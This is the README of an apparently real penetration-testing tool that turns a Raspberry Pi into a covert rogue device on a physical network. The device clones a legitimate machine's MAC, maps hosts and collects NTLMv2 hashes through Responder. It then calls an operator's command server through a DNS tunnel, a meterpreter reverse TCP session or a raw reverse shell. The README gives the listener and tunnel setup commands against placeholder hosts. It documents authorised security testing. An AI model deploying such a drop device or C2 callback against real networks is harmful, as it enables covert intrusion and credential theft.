# LandNav

**Automated rogue device network bootstrapper for penetration testing.**

LandNav automates the full lifecycle of a physical drop device deployment — from establishing a transparent network bridge, through discovering the target network's configuration, to calling back to the operator's C2 infrastructure.  Designed for Raspberry Pi 4B running Kali Linux ARM; runs as a systemd service on boot.

> **Authorised use only.** This tool is designed for use in penetration testing engagements with explicit written authorisation from the network owner.


> **[View full documentation on the Codex Wiki](https://wiki.pr0t31n.com/tools/landnav)** — detailed features, CLI reference, findings catalogue, and integration guides.

## Features

- **Transparent bridge mode** — intercepts traffic between a legitimate device and the network.  The Pi bridges its onboard ethernet and a USB-ethernet adapter.  The switch sees only the legitimate device's MAC (ebtables SNAT).
- **Standalone mode** — auto-detected when no USB-ethernet adapter is present.  The Pi connects directly to the network via its onboard ethernet.
- **Multi-method network discovery:**
  - DHCP sniffing (scapy) — learns gateway, subnet, DNS, domain from the legitimate device's DHCP exchange
  - ARP observation — identifies gateway, active hosts, subnet
  - LLDP/CDP parsing — switch name, VLAN, management IP
  - Smart ARP probing — targets common gateways on common subnets
  - RFC 1918 brute force (last resort) — ARP-based, not interface-rewriting
- **C2 egress cascade:**
  1. **DNS tunnel** (iodine) — UDP/53, almost universally permitted
  2. **Python meterpreter** — reverse TCP on configurable ports (default 4443/8443)
  3. **Raw reverse shell** — fallback if meterpreter staging fails
- **Passive network reconnaissance** — continuous background collection of ARP, DNS, DHCP, NetBIOS, LLMNR, mDNS, SSDP traffic for host/subnet/service mapping
- **Responder analyzer mode** — passive LLMNR/NBT-NS/WPAD observation (no poisoning) to identify targets for later credential interception
- **Proxy detection** — WPAD auto-discovery, common port scanning, HTTP CONNECT support
- **LED status** — Pi's green ACT LED blinks patterns indicating current state (booting, bridge up, network up, C2 connected, error)
- **Watchdog** — monitors C2 health and automatically re-establishes on failure
- **YAML config** — all engagement-specific settings in one file
- **Systemd boot service** — runs automatically on power-up, restarts on failure

## Requirements

- Raspberry Pi 4B (8GB recommended)
- Kali Linux ARM (2024.x+)
- Python 3.10+
- USB-ethernet adapter (for bridge mode; AX88179 chipset recommended)
- Network cable(s)
- iodine DNS tunnel server (running `iodined` on your VPS)
- Metasploit `multi/handler` with `python/meterpreter_reverse_tcp` payload

## Installation

```bash
# Clone the repo on the Pi
git clone https://github.com/pr0t31n/LandNav.git /opt/pr0t31n/landnav
cd /opt/pr0t31n/landnav

# Run the installer (as root)
sudo python3 install.py

# Edit the config
sudo nano config.yaml
```

The installer:
1. Installs system packages (bridge-utils, ebtables, tcpdump, iodine, responder, etc.)
2. Installs Python packages (scapy, PyYAML, netifaces)
3. Detects the networking backend and configures NetworkManager exclusions
4. Installs the systemd boot service
5. Creates `config.yaml` from the example template
6. Creates recon output directories
7. Verifies all dependencies

## Configuration

Copy `config.yaml.example` to `config.yaml` and edit before deploying:

```yaml
c2:
  host: c2.example.com    # C2 callback host
  ports: [4443, 8443]         # Meterpreter ports

dns_tunnel:
  enabled: true
  domain: t.example.com         # NS record → c2.host
  password: changeme           # ← CHANGE THIS

meterpreter:
  enabled: true

network:
  bridge:
    auto_detect: true          # Bridge if USB-eth present
    mac_transparency: true     # Hide Pi's MAC

passive:
  enabled: true                # Continuous passive recon
  flush_interval: 30           # Write data every 30s

responder:
  enabled: true                # Responder -A (analyze, no poisoning)

led:
  enabled: true
```

### DNS Tunnel Server Setup

On your VPS (c2.example.com):

```bash
# Install iodined
apt install iodine

# Start the server (use the same password as config.yaml)
iodined -f -c -P <password> 10.0.0.1 t.example.com
```

DNS records required:
```
t.example.com.    IN  NS  c2.example.com.
```

### Metasploit Listener

```bash
msfconsole -q -x "
  use exploit/multi/handler;
  set payload python/meterpreter_reverse_tcp;
  set LHOST 0.0.0.0;
  set LPORT 4443;
  run -j
"
```

## Usage

### Automatic (boot service)

After installation, LandNav starts on every boot:

```bash
# Enable and start
sudo systemctl enable landnav
sudo systemctl start landnav

# Check status
sudo systemctl status landnav
sudo journalctl -u landnav -f
```

### Manual

```bash
# Normal operation
sudo python3 landnav.py

# Custom config
sudo python3 landnav.py --config /path/to/config.yaml

# Check current state
sudo python3 landnav.py --status

# Version
sudo python3 landnav.py --version
```

## Deployment Procedure

1. **Pre-engagement:** Edit `config.yaml` with engagement-specific settings (C2 host, iodine password, ports).  Set up iodined on your VPS.  Start Metasploit listener.
2. **On-site:** Unplug the legitimate device's ethernet cable from the wall.  Plug the cable into the Pi's onboard ethernet port.  Plug the legitimate device into the Pi's USB-ethernet adapter.  Apply power to the Pi.
3. **Walk away:** LandNav handles everything from here — bridge creation, MAC cloning, network discovery, passive recon, C2 callback.

### Physical Setup (Bridge Mode)

```
Wall Port ──ethernet──► Pi eth0 (onboard)
                         │
                        br0 (bridge)
                         │
                Pi USB-eth (eth1) ──ethernet──► Legitimate Device
```

### LED Status Guide

| Pattern | Meaning |
|---------|---------|
| Slow pulse (0.5 Hz) | Booting |
| Slow blink (1 Hz) | Bridge created |
| Double blink | Network discovery |
| Fast blink (2 Hz) | Network up |
| Triple blink | C2 attempt |
| Solid on | C2 connected |
| SOS (... --- ...) | Error |

## Network Discovery Cascade

LandNav tries methods in order of least-intrusive to most:

1. **DHCP sniff** — passively watches the legitimate device's DHCP exchange through the bridge (zero network footprint)
2. **ARP sniff** — passively watches ARP traffic to learn hosts, gateway, subnet
3. **LLDP/CDP** — passively listens for switch advertisements (VLAN, management IP)
4. **ARP probe** — actively sends targeted ARP requests for common gateway IPs on common subnets
5. **RFC 1918 brute force** — ARP-probes gateway candidates across all private address space

## C2 Egress Cascade

1. **DNS tunnel (iodine)** — encapsulates IP traffic in DNS queries.  Works through most firewalls since DNS is rarely blocked.  ~50-100 kbps throughput.
2. **Python meterpreter** — reverse TCP connection to the operator's Metasploit listener.  Tries each configured port.  Supports HTTP CONNECT proxy if detected.
3. **Raw reverse shell** — minimal Python reverse shell as last resort.  Operator can upgrade from the listener side.

## Passive Reconnaissance

Starting after network validation (Phase 3), LandNav runs continuous background intelligence collection with **zero active traffic**:

### Passive Packet Collector (`lib/passive.py`)

Captures and catalogues:
- **ARP** — IP ↔ MAC mappings, gateway identification
- **DHCP** — new devices, hostnames, lease info
- **DNS** — internal queries (who resolves what)
- **NetBIOS** — Windows hostnames, workgroup/domain names
- **LLMNR** — link-local name queries (LLMNR poisoning candidates)
- **mDNS** — Apple/Linux hostnames, advertised services
- **SSDP** — UPnP device advertisements (IoT, media, routers)
- **802.1Q** — VLAN tag observation

Output files (in `logs/recon/`):

| File | Contents |
|------|----------|
| `hosts.json` | Live host inventory (IP, MAC, hostnames, discovery sources) |
| `subnets.json` | Observed /24 subnets with host counts |
| `dns_queries.log` | Timestamped DNS lookups (who resolves what) |
| `llmnr.json` | LLMNR/NBT-NS broadcast log (poisoning candidates) |
| `services.json` | mDNS/SSDP advertised services per IP |
| `targets.txt` | Deduplicated /24 CIDRs for scanning |

### Responder Analyzer (`lib/responder.py`)

Runs Responder with `-A` flag (analyze mode — **no poisoning**):
- Observes LLMNR/NBT-NS/mDNS/WPAD broadcasts
- Logs which hosts are broadcasting (poisoning candidates for later)
- Captures WPAD requests (proxy auto-config poisoning candidates)
- Records passively observed authentication attempts (NTLMv2 hashes)

Output files (in `logs/recon/responder/`):

| File | Contents |
|------|----------|
| `responder_stdout.log` | Raw Responder output |
| `responder_summary.json` | Consolidated: hashes, poisoning candidates, WPAD requests |
| `*.txt` | Copied from Responder's own logs directory |

### Operator Workflow

When the operator connects via C2, they have a complete network picture:
1. Review `hosts.json` — full host inventory with MACs and hostnames
2. Review `llmnr.json` — which hosts are broadcasting (LLMNR poisoning targets)
3. Review `responder_summary.json` — any captured hashes, WPAD requests
4. Use `targets.txt` — feed into Scattershot3 or other scanning tools
5. Decision: flip Responder to active mode for credential interception

## Files

| File | Purpose |
|------|---------|
| `landnav.py` | Main orchestrator |
| `config.yaml` | Engagement configuration |
| `config.yaml.example` | Config template with defaults |
| `install.py` | Multi-platform installer |
| `requirements.txt` | Python dependencies |
| `VERSION` | Version file |
| `lib/bridge.py` | Transparent bridge manager |
| `lib/discovery.py` | Network discovery (DHCP, ARP, LLDP, probe, brute force) |
| `lib/egress.py` | C2 egress cascade (DNS tunnel, meterpreter, reverse shell) |
| `lib/led.py` | Pi ACT LED status controller |
| `lib/netconfig.py` | Network configuration abstraction |
| `lib/passive.py` | Passive network reconnaissance collector |
| `lib/responder.py` | Responder analyzer mode integration |
| `systemd/landnav.service` | systemd unit file |
| `logs/landnav.log` | Runtime log (created at runtime) |
| `logs/recon/` | Passive recon output (created at runtime) |

## Troubleshooting

### No C2 callback
- Check `sudo journalctl -u landnav -f` for phase-by-phase status
- Verify iodined is running on your VPS: `dig t.example.com`
- Verify Metasploit listener is running on the expected ports
- Check `config.yaml` for typos in host/domain/password

### Bridge not working
- Verify USB-ethernet adapter is detected: `ip link show`
- Check kernel modules: `lsmod | grep -i ax88`
- Try a different USB port (use USB 3.0 for gigabit)

### NetworkManager conflicts
- The installer creates `/etc/NetworkManager/conf.d/landnav-unmanage.conf`
- To restore NM control: `sudo rm /etc/NetworkManager/conf.d/landnav-unmanage.conf && sudo systemctl restart NetworkManager`

### LED not working
- Verify LED path: `ls /sys/class/leds/ACT/`
- Test manually: `echo none > /sys/class/leds/ACT/trigger && echo 1 > /sys/class/leds/ACT/brightness`

### Passive recon not collecting
- Check `logs/recon/hosts.json` — should populate within 30s of startup
- Verify interface: passive collector uses br0 (bridge) or eth0 (standalone)
- Check permissions: requires root (CAP_NET_RAW for packet capture)

### Responder not starting
- Verify installed: `which responder` or `ls /usr/share/responder/Responder.py`
- On Kali: `apt install responder`
- Check `logs/recon/responder/responder_stderr.log` for errors
- Set `responder.enabled: false` in config.yaml to disable

## Uninstall

```bash
sudo python3 install.py --uninstall
```

This removes the systemd service and NetworkManager exclusion.  Files in `/opt/pr0t31n/landnav/` are left intact.

## Integration

LandNav is part of the pr0t31n penetration testing toolkit.  It integrates with:
- **Arsenal** — tool registry and version management
- **Crucible / Scattershot3** — target files generated by LandNav can feed into network scanning
- **Metasploit** — primary C2 via python meterpreter reverse TCP
- **Responder** — analyze mode for passive credential/hash collection

## Version History

- **0.2.0** — Passive network reconnaissance: continuous ARP/DNS/DHCP/NetBIOS/LLMNR/mDNS/SSDP collection, Responder analyzer mode integration, structured recon output.
- **0.1.0** — Initial release.  Bridge mode, standalone mode, DNS tunnel, meterpreter callback, LED status, systemd service.
